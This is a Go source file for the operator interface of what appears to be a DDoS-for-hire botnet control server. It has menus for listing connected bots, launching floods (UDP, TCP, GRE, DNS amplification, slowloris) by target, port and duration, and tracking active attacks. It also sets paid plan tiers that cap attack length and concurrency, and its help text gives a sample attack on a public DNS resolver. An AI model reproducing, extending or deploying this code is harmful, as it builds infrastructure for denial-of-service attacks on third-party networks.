package main

import (
	"fmt"
	"net"
	"strings"
	"time"
)

func showWelcome(conn net.Conn, username string) {
	sendLine(conn, "")
	sendLine(conn, "[ + ] Welcome "+username+" your now connected to the Blade servers.")
	sendLine(conn, "[ + ] Dev - reverance")
	sendLine(conn, "[ + ] Type help for commands")
	sendLine(conn, "[ + ] GitHub: github.com/itsreverance")
	sendLine(conn, "")
}

func showHelp(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "help     - Show this menu")
	sendLine(conn, "bots     - List connected bots")
	sendLine(conn, "attacks  - Show active attacks")
	sendLine(conn, "methods  - List attack methods")
	sendLine(conn, "scan     - Scan a network range")
	sendLine(conn, "clear    - Clear screen")
	sendLine(conn, "logout   - Disconnect")
	sendLine(conn, "plan     - Show your plan")
	sendLine(conn, "owner    - Show owner info")
	sendLine(conn, "")
	sendLine(conn, "Attack: <method> <target> <port> <duration>")
	sendLine(conn, "Example: udp 8.8.8.8 53 30")
	sendLine(conn, "")
}

func showMethods(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "udp       - UDP flood")
	sendLine(conn, "tcp       - TCP flood")
	sendLine(conn, "raw       - Raw socket flood")
	sendLine(conn, "gre       - GRE/IPIP flood")
	sendLine(conn, "dns       - DNS amplification")
	sendLine(conn, "hex       - HEX flood")
	sendLine(conn, "hold      - Connection hold")
	sendLine(conn, "mix       - Mixed attack")
	sendLine(conn, "slowloris - Slowloris attack")
	sendLine(conn, "")
}

func showOwner(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "GitHub: github.com/itsreverance")
	sendLine(conn, "Dev: reverance")
	sendLine(conn, "")
}

func showPlan(conn net.Conn, username string) {
	plan := getUserPlan(username)
	sendLine(conn, "")
	sendLine(conn, "Plan: "+plan)
	if plan == "VIP" {
		sendLine(conn, "  Duration: 3600s")
		sendLine(conn, "  Daily: Unlimited")
		sendLine(conn, "  Methods: All")
		sendLine(conn, "  Concurrent: 10")
	} else if plan == "PREMIUM" {
		sendLine(conn, "  Duration: 1200s")
		sendLine(conn, "  Daily: 500")
		sendLine(conn, "  Methods: Most (no GRE/DNS)")
		sendLine(conn, "  Concurrent: 5")
	} else {
		sendLine(conn, "  Duration: 300s")
		sendLine(conn, "  Daily: 50")
		sendLine(conn, "  Methods: UDP/TCP/SYN only")
		sendLine(conn, "  Concurrent: 1")
	}
	sendLine(conn, "")
}

func showBots(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "Connected Bots: "+fmt.Sprintf("%d", len(bots)))
	if len(bots) == 0 {
		sendLine(conn, "  No bots connected.")
	} else {
		for id, info := range bots {
			sendLine(conn, "  "+id+" | "+info.Arch+" | "+info.Status+" | "+info.IP)
		}
	}
	sendLine(conn, "")
}

func showAttacks(conn net.Conn) {
	sendLine(conn, "")
	sendLine(conn, "Active Attacks: "+fmt.Sprintf("%d", len(attacks)))
	if len(attacks) == 0 {
		sendLine(conn, "  No active attacks.")
	} else {
		for _, a := range attacks {
			sendLine(conn, "  "+a.Target+" | "+a.Method+" | "+fmt.Sprintf("%ds", a.Remaining)+" | "+a.User)
		}
	}
	sendLine(conn, "")
}

func showAttackDetails(conn net.Conn, method, target, port, duration, username string, isp string) {
	sendLine(conn, "")
	sendLine(conn, "[Attack Launched]")
	sendLine(conn, " Target:   "+target)
	sendLine(conn, " Port:     "+port)
	sendLine(conn, " Method:   "+method)
	sendLine(conn, " Duration: "+duration+"s")
	sendLine(conn, " Time sent ["+time.Now().Format("15:04")+"]")
	sendLine(conn, " ISP:      "+isp)
	sendLine(conn, "")
}

func showError(conn net.Conn, msg string) {
	sendLine(conn, "")
	sendLine(conn, "[!] "+msg)
	sendLine(conn, "")
}

func showSuccess(conn net.Conn, msg string) {
	sendLine(conn, "")
	sendLine(conn, "[+] "+msg)
	sendLine(conn, "")
}

func showInfo(conn net.Conn, msg string) {
	sendLine(conn, "")
	sendLine(conn, "[*] "+msg)
	sendLine(conn, "")
}

func showScanResults(conn net.Conn, results []string) {
	sendLine(conn, "")
	sendLine(conn, "Scan Results:")
	if len(results) == 0 {
		sendLine(conn, "  No hosts found.")
	} else {
		for _, r := range results {
			sendLine(conn, "  [+] "+r)
		}
	}
	sendLine(conn, "")
}

func getISP(ip string) string {
	// Placeholder - will add real IP lookup later
	return "Unknown"
}

func validateIP(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, p := range parts {
		if len(p) == 0 {
			return false
		}
		for _, c := range p {
			if c < '0' || c > '9' {
				return false
			}
		}
	}
	return true
}

func validatePort(port string) bool {
	for _, c := range port {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func validateDuration(duration string) bool {
	for _, c := range duration {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}